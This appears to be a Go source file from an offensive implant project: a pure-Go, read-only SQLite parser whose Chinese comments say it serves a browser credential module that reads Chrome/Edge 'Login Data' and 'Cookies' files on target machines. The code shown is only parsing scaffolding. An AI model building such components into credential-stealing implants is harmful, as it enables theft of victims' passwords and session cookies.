// Package sqlite 只读的 SQLite 表读取器（纯 Go，零依赖）。
//
// 存在的理由：浏览器凭据模块要读 Chrome/Edge 的 `Login Data` 与 `Cookies`
// （都是 SQLite 库），而植入体不能为此引入驱动：
//   - go-sqlite3 需要 cgo，而植入体是全矩阵交叉编译（CGO_ENABLED=0），且模板体积敏感；
//   - 纯 Go 驱动（modernc）会把 141 个模板每个撑大数 MB。
//
// 因此这里只实现"按表读行"这一条路径：定位表根页（sqlite_master）→ 遍历表 b-tree
// → 解码记录（varint/serial type）→ 必要时拼接溢出页。不做 SQL 解析、不做写入、
// 不做索引（全表扫描对 intranet 级别的浏览器库足够）。
//
// 安全边界：所有长度字段都按页/库大小钳制，任何越界或畸形结构返回错误而不是
// panic 或无限循环 —— 输入是目标机上的文件，可能是损坏的、被截断的，
// 甚至是别人故意构造的。
package sqlite

import "os"

// 数据库头（前 100 字节）里的固定字段
const (
	headerSize    = 100
	headerMagic   = "SQLite format 3\x00"
	maxPageSize   = 65536
	minPageSize   = 512
	maxLocalTable = 1024 // 表 b-tree 的 maxLocal 计算里用的常量
)

// b-tree 页类型
const (
	pageInteriorIndex = 2
	pageInteriorTable = 5
	pageLeafIndex     = 10
	pageLeafTable     = 13
)

// Value 一个列值：nil / int64 / float64 / string / []byte
type Value = interface{}

// Row 一行（列名 → 值）
type Row = map[string]Value

// DB 打开后的数据库（内存视图 + WAL 覆盖）
type DB struct {
	data       []byte // 主库文件内容（只读）
	pageSize   int
	usableSize int
	reserved   int
	encoding   int // 1 = UTF-8，2/3 = UTF-16（Chrome/Edge 都是 1）
	pages      int // 主库页数

	wal       *walIndex // nil 表示没有可用 WAL
	walSource *os.File  // WAL 文件句柄（按需读帧）
}

// Column 列名与序号
type Column struct {
	Name string
	Pos  int
}

// Table 表句柄：根页 + 列清单
type Table struct {
	db       *DB
	name     string
	root     int
	cols     []Column
	byName   map[string]int
	rowidCol int // 声明为 INTEGER PRIMARY KEY 的列序号（-1 表示没有）
}

// Col 取列序号（-1 表示不存在）
func (t *Table) Col(name string) int {
	if i, ok := t.byName[name]; ok {
		return i
	}
	return -1
}

// Columns 列名清单（按表定义顺序）
func (t *Table) Columns() []string {
	out := make([]string, 0, len(t.cols))
	for _, c := range t.cols {
		out = append(out, c.Name)
	}
	return out
}

// Filter 行过滤条件（只支持 rowid 数值比较，够用且好验证）
type Filter struct {
	Op  string // ">="、">"、"<"、"<="、"=="
	Val int64
}

// Match 该 rowid 是否命中过滤条件
func (f *Filter) Match(rowid int64) bool {
	if f == nil {
		return true
	}
	switch f.Op {
	case ">=":
		return rowid >= f.Val
	case ">":
		return rowid > f.Val
	case "<":
		return rowid < f.Val
	case "<=":
		return rowid <= f.Val
	case "==", "=":
		return rowid == f.Val
	default:
		return true
	}
}

// MaxRows 单次读取的行数上限（浏览器库被投毒/异常时可以很大，必须有界）
const MaxRows = 200000
